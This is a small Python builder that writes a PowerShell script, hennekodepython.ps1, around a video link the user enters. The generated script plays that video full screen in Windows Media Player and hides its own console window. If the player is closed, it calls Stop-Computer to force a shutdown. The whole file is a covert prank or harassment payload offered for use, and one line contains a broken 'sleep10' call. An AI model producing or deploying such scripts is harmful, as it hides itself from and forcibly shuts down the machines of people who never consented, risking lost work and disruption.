onedata = str('& "C:\Program Files\Windows Media Player\wmplayer.exe" "http://my.mixtape.moe/bzobfc.mp4" /fullscreen\n\nAdd-Type -Name Window -Namespace Console -MemberDefinition \' \n[DllImport("Kernel32.dll")]\npublic static extern IntPtr GetConsoleWindow();\n\n[DllImport("user32.dll")]\npublic static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);\n\'\nfunction Hide-Console\n{\n    $consolePtr = [Console.Window]::GetConsoleWindow()\n    #0 hide\n    [Console.Window]::ShowWindow($consolePtr, 0)\n}\nHide-Console\n\nFunction checkplayer{\n$ErrorOccured = $false\n\ntry \n{ \n   $ErrorActionPreference = \'Stop\'\nGet-Process wmplayer\n}\ncatch\n{\n   Stop-Computer\n   $ErrorOccured=$true\n}\n\nif(!$ErrorOccured) {"No Error Occured"}\n}\n\nfunction chepeat{\nsleep10\ncheckplayer\nsleep 1\ncheckplayer\nsleep 1\ncheckplayer\nsleep 1\ncheckplayer\nsleep 1\n}\n\nchepeat')
link = str(input("Link a usar: "))

print (onedata.replace("http://my.mixtape.moe/bzobfc.mp4", link))

import sys
sys.stdout=open("hennekodepython.ps1","w")
print (onedata.replace("http://my.mixtape.moe/bzobfc.mp4", link))
sys.stdout.close()

f= open("hennekodepython.ps1","w+")
f.write(onedata.replace("http://my.mixtape.moe/bzobfc.mp4", link))
f.close()